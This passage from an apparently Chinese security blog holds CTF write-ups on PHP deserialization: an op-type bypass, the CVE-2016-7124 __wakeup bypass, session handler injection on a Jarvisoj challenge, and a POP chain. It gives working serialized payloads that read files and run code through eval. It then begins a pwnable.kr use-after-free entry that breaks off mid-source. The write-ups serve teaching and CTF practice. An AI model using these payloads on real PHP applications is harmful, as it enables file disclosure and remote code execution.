&#125;</code></pre><p>在这里可以看到当对象结束（销毁）的时候会调用这个函数，我们可以看到if 判断op === “2”</p>
<p>然后调用process();</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">    if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">        $this-&gt;write();</span><br><span class="line">    &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">        $res &#x3D; $this-&gt;read();</span><br><span class="line">        $this-&gt;output($res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，如果op == “1” 会调用write写入函数，如果op == “2”” 的话，会调用read函数。</p>
<p>所以需要使得op = “2”才能获取flag        上面__destruct()函数中为op === “2”</p>
<p>利用PHP弱类型的特性使得 op=” 2”即可绕过 === 时使得后面语句无法使用==空格会先做转义</p>
<p>然后执行read()函数</p>
<pre><code>private function read() &#123;
    $res = &quot;&quot;;
    if(isset($this-&gt;filename)) &#123;
        $res = file_get_contents($this-&gt;filename);
    &#125;
    return $res;
&#125;</code></pre><p>构造语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">    class FileHandler&#123;</span><br><span class="line">        public $op &#x3D; &#39; 2&#39;;</span><br><span class="line">        public $filename &#x3D; &#39;flag.php&#39;;</span><br><span class="line">        public $content &#x3D; &#39;ol4three&#39;;</span><br><span class="line">    &#125;   </span><br><span class="line">        $flag &#x3D; new FileHandler();</span><br><span class="line">        echo serialize($flag);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ php test.php</span><br><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:8:&quot;ol4three&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:8:&quot;ol4three&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122172140545.png" alt="image-20210122172140545"></p>
<h1 id="反序列化对象注入"><a href="#反序列化对象注入" class="headerlink" title="反序列化对象注入"></a>反序列化对象注入</h1><h2 id="CVE-2016-7124-wakeup绕过"><a href="#CVE-2016-7124-wakeup绕过" class="headerlink" title="CVE-2016-7124 __wakeup绕过"></a>CVE-2016-7124 __wakeup绕过</h2><h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p><strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p>
<p>构造序列化对象：O:1:”A”:1:{s:6:”target”;s:18:”<?php phpinfo();?>“;}<br><strong>绕过__wakeup</strong>：O:<strong>2</strong>:”A”:1:{s:6:”target”;s:18:”<?php phpinfo();?>“;}</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>php5 &lt; 5.6.25<br>php7 &lt; 7.0.10</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?    </span><br><span class="line">    class A&#123;</span><br><span class="line">        public $target &#x3D; &quot;test&quot;;</span><br><span class="line">        function __wakeup()&#123;</span><br><span class="line">            $this-&gt;target &#x3D; &quot;wakeup!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            $fp &#x3D; fopen(&quot;&#x2F;Library&#x2F;WebServer&#x2F;Documents&#x2F;hello.php&quot;,&quot;w&quot;);</span><br><span class="line">            fputs($fp,$this-&gt;target);</span><br><span class="line">            fclose($fp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a &#x3D; $_GET[&#39;test&#39;];</span><br><span class="line">    $b &#x3D; unserialize($a);</span><br><span class="line">    echo &quot;hello.php&quot;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    include(&quot;.&#x2F;hello.php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>魔法函数<code>__wakeup()</code>要比<code>__destruct()</code>先执行，所以我们之间传入<br><code>O:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</code><br>时会被先执行的<code>__wakeup()</code>函数<code>$target</code>赋值覆盖为<code>wakeup!</code>，然后生成的<code>hello.php</code>里面的内容就是<code>wakeup!</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122174039083.png" alt="image-20210122174039083"></p>
<p>现在我们根据绕过方法：对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行，对象个数原来是1我们将其改为2，也就是<br><code>O:2:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</code><br>就能实现绕过</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122180744274.png" alt="image-20210122180744274"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122180753722.png" alt="image-20210122180753722"></p>
<h1 id="Session-反序列化漏洞"><a href="#Session-反序列化漏洞" class="headerlink" title="Session 反序列化漏洞"></a>Session 反序列化漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化<br>在php.ini中有以下配置项，wamp的默认配置如图</p>
</blockquote>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122194708328.png" alt="image-20210122194708328"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122194716896.png" alt="image-20210122194716896"></p>
<p><code>session.save_path</code> 设置session的存储路径<br><code>session.save_handler</code> 设定用户自定义存储函数<br><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话<br><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php<br>除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</p>
<ul>
<li>php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</li>
<li>php 键名＋竖线＋经过serialize()函数反序列处理的值</li>
<li>php_serialize serialize()函数反序列处理数组方式</li>
</ul>
<h2 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h2><p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值。<br>来测试一个demo</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#39;name&#39;] &#x3D; &#39;ol4three&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行后在配置文件设定的路径中会生成一个session文件</p>
<p>存储引擎为php_serialize:</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122200533548.png" alt="image-20210122200533548"></p>
<p>存储引擎为php:</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122200603005.png" alt="image-20210122200603005"></p>
<p>存储引擎为php_binary:</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122200634452.png" alt="image-20210122200634452"></p>
<p>三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。</p>
<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><h3 id="Jarvisoj-Web"><a href="#Jarvisoj-Web" class="headerlink" title="Jarvisoj Web"></a>Jarvisoj Web</h3><blockquote>
<p>题目地址：<a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;A webshell is wait for you</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;phpinfo&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m &#x3D; new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#39;index.php&#39;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://web.jarvisoj.com:32784/index.php?phpinfo">http://web.jarvisoj.com:32784/index.php?phpinfo</a></p>
<p>先来看一看phpinfo里的内容 php版本：5.6.21<br><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122201357854.png" alt="image-20210122201357854"></p>
<p>默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125094633177.png" alt="image-20210125094633177"></p>
<blockquote>
<p>PHP手册<br>Session 上传进度<br>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</p>
</blockquote>
<p>了解了之后，就可以通过POST方法来构造数据传入<code>$_SESSION</code><br>构造POST提交表单</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>构造序列化字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz&#x3D;&#39;print_r(dirname(__FILE__));&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new OowoO();</span><br><span class="line">$a &#x3D; serialize($obj);</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>

<p>注意需要转义，抓包吧filename改为payload<br>最终提交为：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;&#125;</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125100500866.png" alt="image-20210125100500866"></p>
<p>目录/opt/lampp/htdocs<br><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code>读目录</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125100541463.png" alt="image-20210125100541463"></p>
<p>用<code>file_get_contents</code>函数读flag<br><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125100717889.png" alt="image-20210125100717889"></p>
<h1 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h1><h3 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h3><blockquote>
<p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p>
</blockquote>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<strong>进行反序列化的数据能够被用户输入所控制。</strong></p>
<h2 id="pop链利用"><a href="#pop链利用" class="headerlink" title="pop链利用"></a>pop链利用</h2><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<h2 id="实战训练"><a href="#实战训练" class="headerlink" title="实战训练"></a>实战训练</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 &#x3D; $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 &#x3D; &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;this_i3_you4_flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; $_GET[&#39;string&#39;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p>
<ol>
<li><code>string1</code>中的<code>__tostring</code>存在<code>$this-&gt;str1-&gt;get_flag()</code>，分析一下要自动调用<code>__tostring()</code>需要把类<code>string1</code>当成字符串来使用，因为调用的是参数<code>str1</code>的方法，所以需要把<code>str1</code>赋值为类<code>GetFlag</code>的对象。</li>
<li>发现类<code>func</code>中存在<code>__invoke</code>方法执行了字符串拼接，需要把<code>func</code>当成函数使用自动调用<code>__invoke</code>然后把<code>$mod1</code>赋值为<code>string1</code>的对象与<code>$mod2</code>拼接。</li>
<li>在<code>funct</code>中找到了函数调用，需要把<code>mod1</code>赋值为<code>func</code>类的对象，又因为函数调用在<code>__call</code>方法中，且参数为<code>$test2</code>,即无法调用<code>test2</code>方法时自动调用 <code>__call</code>方法；</li>
<li>在<code>Call</code>中的<code>test1</code>方法中存在<code>$this-&gt;mod1-&gt;test2();</code>，需要把<code>$mod1</code>赋值为<code>funct</code>的对象，让<code>__call</code>自动调用。</li>
<li>查找<code>test1</code>方法的调用点，在<code>start_gg</code>中发现<code>$this-&gt;mod1-&gt;test1();</code>，把<code>$mod1</code>赋值为<code>start_gg</code>类的对象，等待<code>__destruct()</code>自动调用。</li>
</ol>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 &#x3D; new Call();&#x2F;&#x2F;把$mod1赋值为Call类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 &#x3D; new funct();&#x2F;&#x2F;把 $mod1赋值为funct类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function test1()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1&#x3D; new func();&#x2F;&#x2F;把 $mod1赋值为func类对象</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 &#x3D; $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1&#x3D; new string1();&#x2F;&#x2F;把 $mod1赋值为string1类对象</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;mod2 &#x3D; &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1&#x3D; new GetFlag();&#x2F;&#x2F;把 $str1赋值为GetFlag类对象          </span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b &#x3D; new start_gg;&#x2F;&#x2F;构造start_gg类对象$b</span><br><span class="line">echo urlencode(serialize($b)).&quot;&lt;br &#x2F;&gt;&quot;;&#x2F;&#x2F;显示输出url编码后的序列化对象</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125101611775.png" alt="image-20210125101611775"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>反序列化漏洞一般都是在白盒审计时发现并利用，需要构造PHP序列化代码，利用条件比较苛刻。</p>
<p>总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。</p>
<p>另外再贴一些相关文章，希望对大家有所帮助</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p>
<p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
<p><a href="https://xz.aliyun.com/t/3674#toc-17">https://xz.aliyun.com/t/3674#toc-17</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr uaf</title>
    <url>/2021/01/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwnable.kr/pwnable-kr-uaf/</url>
    <content><![CDATA[<h1 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h1><ul>
<li>虚函数的内存地址空间</li>
<li>UAF</li>
</ul>
<h2 id="虚函数的内存地址"><a href="#虚函数的内存地址" class="headerlink" title="虚函数的内存地址"></a>虚函数的内存地址</h2><p>在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。<br>对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128112747995.png" alt="image-20210128112747995" style="zoom:50%;">

<a id="more"></a>

<h3 id="Code："><a href="#Code：" class="headerlink" title="Code："></a>Code：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Base </span><br><span class="line">&#123; </span><br><span class="line">    public: </span><br><span class="line">        virtual void f() &#123; cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; &#125; </span><br><span class="line">        virtual void g() &#123; cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; &#125; </span><br><span class="line">        virtual void h() &#123; cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; &#125; </span><br><span class="line">    int base; </span><br><span class="line">    protected: </span><br><span class="line">    private: </span><br><span class="line">&#125;; </span><br><span class="line">&#x2F;&#x2F;子类1，无虚函数重载 </span><br><span class="line">class Child1 : public Base </span><br><span class="line">&#123; </span><br><span class="line">    public: </span><br><span class="line">        virtual void f1() &#123; cout &lt;&lt; &quot;Child1::f1&quot; &lt;&lt; endl; &#125; </span><br><span class="line">        virtual void g1() &#123; cout &lt;&lt; &quot;Child1::g1&quot; &lt;&lt; endl; &#125; </span><br><span class="line">        virtual void h1() &#123; cout &lt;&lt; &quot;Child1::h1&quot; &lt;&lt; endl; &#125; </span><br><span class="line">    int child1; </span><br><span class="line">    protected: </span><br><span class="line">    private: </span><br><span class="line">&#125;; </span><br><span class="line">&#x2F;&#x2F;子类2，有1个虚函数重载 </span><br><span class="line">class Child2 : public Base </span><br><span class="line">&#123; </span><br><span class="line">    public: </span><br><span class="line">        virtual void f() &#123; cout &lt;&lt; &quot;Child2::f&quot; &lt;&lt; endl; &#125; </span><br><span class="line">        virtual void g2() &#123; cout &lt;&lt; &quot;Child2::g2&quot; &lt;&lt; endl; &#125; </span><br><span class="line">        virtual void h2() &#123; cout &lt;&lt; &quot;Child2::h2&quot; &lt;&lt; endl; &#125; </span><br><span class="line">    int child2; </span><br><span class="line">    protected: </span><br><span class="line">    private: </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="单一继承，无虚函数重载"><a href="#单一继承，无虚函数重载" class="headerlink" title="单一继承，无虚函数重载"></a>单一继承，无虚函数重载</h3><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128112955403.png" alt="image-20210128112955403" style="zoom:50%;">

<h3 id="单一继承，重载了虚函数"><a href="#单一继承，重载了虚函数" class="headerlink" title="单一继承，重载了虚函数"></a>单一继承，重载了虚函数</h3><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128113057868.png" alt="image-20210128113057868" style="zoom:50%;">

<h3 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h3><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128114243078.png" alt="image-20210128114243078" style="zoom:50%;">

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128114322025.png" alt="image-20210128114322025" style="zoom:50%;">

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。<strong>注意这并不是直接继承了私有(private)虚函数</strong></li>
<li>当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。</li>
<li>vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr</li>
</ul>
<h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>可以看上一遍介绍</p>
<h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a><br><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf">https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf</a><br><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf.cpp">https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf.cpp</a></p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Human&#123;</span><br><span class="line">private:</span><br><span class="line">	virtual void give_shell()&#123;</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">protected:</span><br><span class="line">	int age;</span><br><span class="line">	string name;</span><br><span class="line">public:</span><br><span class="line">	virtual void introduce()&#123;</span><br><span class="line">		cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">class Man: public Human&#123;</span><br><span class="line">public:</span><br><span class="line">        Man(string name, int 